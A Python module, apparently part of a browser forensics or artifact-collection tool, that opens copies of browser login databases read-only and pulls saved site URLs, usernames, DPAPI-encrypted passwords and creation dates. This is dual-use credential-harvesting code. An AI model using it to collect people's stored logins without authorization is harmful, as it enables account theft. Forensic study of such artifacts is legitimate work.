import sqlite3
from services.utils.utils import convert_webkit_time, safe_copy

def extract_logins(browser, files, user_profile):
    logins = []
    for db_file in files:
        try:

            safe_db = safe_copy(db_file)
            if not safe_db:
                continue

            conn = sqlite3.connect(f"file:{safe_db}?mode=ro", uri=True)
            cursor = conn.cursor()

            cursor.execute("""
                SELECT origin_url, username_value, password_value, date_created
                FROM logins
            """)

            for row in cursor.fetchall():
                url, username, encrypted_password, date_created = row

                # Password is encrypted (DPAPI)
                logins.append([
                    url,
                    username,
                    encrypted_password,  # raw encrypted
                    convert_webkit_time(date_created)
                ])

            conn.close()

        except sqlite3.Error as e:
            print(f"Error extracting logins from {db_file}: {e}")

    return logins